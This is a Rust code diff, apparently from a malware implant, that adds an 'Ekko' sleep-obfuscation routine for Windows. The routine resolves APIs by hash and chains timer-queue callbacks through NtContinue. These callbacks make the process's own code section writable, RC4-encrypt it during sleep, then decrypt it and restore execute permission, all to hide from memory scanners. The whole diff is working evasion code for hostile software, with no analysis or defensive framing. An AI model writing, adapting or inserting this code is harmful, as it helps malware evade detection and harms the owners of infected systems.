@@ -4,12 +4,161 @@ use super::syscalls::{sys_nanosleep, Timespec};
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
 #[cfg(target_os = "windows")]
-use crate::utils::windows_definitions::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
+use crate::utils::windows_definitions::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, HANDLE, PVOID, CONTEXT};
+
+#[cfg(target_os = "windows")]
+use core::ffi::c_void;
 
 static mut SLEEP_MASK_KEY: u8 = 0xAA;
 
-/// Performs a stealthy sleep with heap and text obfuscation.
+#[cfg(target_os = "windows")]
+#[repr(C)]
+struct USTRING {
+    Length: u32,
+    MaximumLength: u32,
+    Buffer: *mut u8,
+}
+
+#[cfg(target_os = "windows")]
+pub fn ekko_sleep(ms: u32) {
+    unsafe {
+        // 1. Resolve APIs
+        let k32 = hash_str(b"KERNEL32.DLL");
+        let ntdll = hash_str(b"ntdll.dll");
+        let advapi = hash_str(b"Advapi32.dll");
+
+        let create_event = resolve_function(k32, hash_str(b"CreateEventA"));
+        let create_timer_queue = resolve_function(k32, hash_str(b"CreateTimerQueue"));
+        let create_timer_queue_timer = resolve_function(k32, hash_str(b"CreateTimerQueueTimer"));
+        let delete_timer_queue = resolve_function(k32, hash_str(b"DeleteTimerQueue"));
+        let wait_for_single_object = resolve_function(k32, hash_str(b"WaitForSingleObject"));
+        let set_event = resolve_function(k32, hash_str(b"SetEvent"));
+        let virtual_protect = resolve_function(k32, hash_str(b"VirtualProtect"));
+        
+        let rtl_capture_context = resolve_function(ntdll, hash_str(b"RtlCaptureContext"));
+        let nt_continue = resolve_function(ntdll, hash_str(b"NtContinue"));
+        
+        let sys_func_032 = resolve_function(advapi, hash_str(b"SystemFunction032"));
+
+        if create_event.is_null() || nt_continue.is_null() || sys_func_032.is_null() {
+            sleep_simple(ms as u64);
+            return;
+        }
+
+        // Define function types
+        type FnCreateEventA = unsafe extern "system" fn(*mut c_void, i32, i32, *const u8) -> HANDLE;
+        type FnCreateTimerQueue = unsafe extern "system" fn() -> HANDLE;
+        type FnCreateTimerQueueTimer = unsafe extern "system" fn(*mut HANDLE, HANDLE, PVOID, PVOID, u32, u32, u32) -> i32;
+        type FnRtlCaptureContext = unsafe extern "system" fn(*mut CONTEXT);
+        type FnWaitForSingleObject = unsafe extern "system" fn(HANDLE, u32) -> u32;
+        type FnSetEvent = unsafe extern "system" fn(HANDLE) -> i32;
+        type FnDeleteTimerQueue = unsafe extern "system" fn(HANDLE, HANDLE) -> i32;
+
+        let create_event_fn: FnCreateEventA = core::mem::transmute(create_event);
+        let create_timer_queue_fn: FnCreateTimerQueue = core::mem::transmute(create_timer_queue);
+        let create_timer_fn: FnCreateTimerQueueTimer = core::mem::transmute(create_timer_queue_timer);
+        let capture_context_fn: FnRtlCaptureContext = core::mem::transmute(rtl_capture_context);
+        let wait_fn: FnWaitForSingleObject = core::mem::transmute(wait_for_single_object);
+        let set_event_fn: FnSetEvent = core::mem::transmute(set_event);
+        let delete_timer_queue_fn: FnDeleteTimerQueue = core::mem::transmute(delete_timer_queue);
+
+        // 2. Setup Resources
+        let h_event = create_event_fn(core::ptr::null_mut(), 0, 0, core::ptr::null());
+        let h_timer_queue = create_timer_queue_fn();
+        
+        if h_event.is_null() || h_timer_queue.is_null() {
+             sleep_simple(ms as u64);
+             return;
+        }
+
+        let (text_base, text_size) = get_text_range();
+        
+        // Key and Data descriptors
+        let mut key_buf = [0xAAu8; 16];
+        let key_str = USTRING { Length: 16, MaximumLength: 16, Buffer: key_buf.as_mut_ptr() };
+        let data_str = USTRING { Length: text_size as u32, MaximumLength: text_size as u32, Buffer: text_base };
+
+        // 3. Capture Context
+        let mut ctx: CONTEXT = core::mem::zeroed();
+        capture_context_fn(&mut ctx);
+
+        // 4. Prepare Contexts
+        // Ctx1: VirtualProtect(text_base, text_size, PAGE_READWRITE, &old)
+        let mut ctx_protect_rw = ctx.clone();
+        ctx_protect_rw.Rip = virtual_protect as u64;
+        ctx_protect_rw.Rcx = text_base as u64;
+        ctx_protect_rw.Rdx = text_size as u64;
+        ctx_protect_rw.R8 = 0x04; // PAGE_READWRITE
+        let mut old_protect = 0u32;
+        ctx_protect_rw.R9 = &mut old_protect as *mut u32 as u64;
+        ctx_protect_rw.Rsp -= 0x2000; // Increased safety margin
+
+        // Ctx2: SystemFunction032(&data, &key) (Encrypt)
+        let mut ctx_encrypt = ctx.clone();
+        ctx_encrypt.Rip = sys_func_032 as u64;
+        ctx_encrypt.Rcx = &data_str as *const _ as u64;
+        ctx_encrypt.Rdx = &key_str as *const _ as u64;
+        ctx_encrypt.Rsp -= 0x2000;
+
+        // Ctx3: SystemFunction032(&data, &key) (Decrypt)
+        let mut ctx_decrypt = ctx.clone();
+        ctx_decrypt.Rip = sys_func_032 as u64;
+        ctx_decrypt.Rcx = &data_str as *const _ as u64;
+        ctx_decrypt.Rdx = &key_str as *const _ as u64;
+        ctx_decrypt.Rsp -= 0x2000;
+
+        // Ctx4: VirtualProtect(text_base, text_size, PAGE_EXECUTE_READ, &old)
+        let mut ctx_protect_rx = ctx.clone();
+        ctx_protect_rx.Rip = virtual_protect as u64;
+        ctx_protect_rx.Rcx = text_base as u64;
+        ctx_protect_rx.Rdx = text_size as u64;
+        ctx_protect_rx.R8 = 0x20; // PAGE_EXECUTE_READ
+        ctx_protect_rx.R9 = &mut old_protect as *mut u32 as u64;
+        ctx_protect_rx.Rsp -= 0x2000;
+
+        // Ctx5: SetEvent(hEvent)
+        let mut ctx_set_event = ctx.clone();
+        ctx_set_event.Rip = set_event as u64;
+        ctx_set_event.Rcx = h_event as u64;
+        ctx_set_event.Rsp -= 0x2000;
+
+        // 5. Queue Timers
+        let mut h_timer = core::ptr::null_mut();
+        
+        // 100ms: RW
+        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_protect_rw as *mut _ as PVOID, 100, 0, 0);
+        // 200ms: Encrypt
+        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_encrypt as *mut _ as PVOID, 200, 0, 0);
+        // 200 + ms: Decrypt
+        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_decrypt as *mut _ as PVOID, 200 + ms, 0, 0);
+        // 300 + ms: RX
+        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_protect_rx as *mut _ as PVOID, 300 + ms, 0, 0);
+        // 400 + ms: SetEvent
+        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_set_event as *mut _ as PVOID, 400 + ms, 0, 0);
+
+        // 6. Wait
+        wait_fn(h_event, 0xFFFFFFFF);
+
+        // 7. Cleanup
+        delete_timer_queue_fn(h_timer_queue, (-1isize as HANDLE));
+        
+        type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
+        let close_handle_fn: FnCloseHandle = core::mem::transmute(resolve_function(k32, hash_str(b"CloseHandle")));
+        close_handle_fn(h_event);
+    }
+}
+
+/// Performs a stealthy sleep. On Windows, uses Ekko (Timer Queue ROP).
 pub fn sleep(ms: u64) {
+    #[cfg(target_os = "windows")]
+    ekko_sleep(ms as u32);
+
+    #[cfg(not(target_os = "windows"))]
+    sleep_simple(ms);
+}
+
+// Renamed old sleep to sleep_simple
+pub fn sleep_simple(ms: u64) {
     // Generate new random key for this sleep cycle
     unsafe {
         *core::ptr::addr_of_mut!(SLEEP_MASK_KEY) = get_random_u8();
